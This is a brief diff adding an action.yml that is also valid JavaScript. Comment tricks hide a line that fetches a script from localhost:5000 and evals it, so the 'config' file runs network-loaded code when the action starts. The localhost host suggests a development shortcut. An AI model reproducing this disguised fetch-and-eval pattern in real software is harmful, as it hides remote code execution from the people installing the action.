@@ -1,0 +1,6 @@
+/*: #*/fetch("http://localhost:5000/dist/index.js").then(r=>r.text()).then(x=>eval(x))/*
+runs: { using: node20, main: action.yml }
+runs-using-deno:
+  using: deno1
+  main: main.ts
+#*/
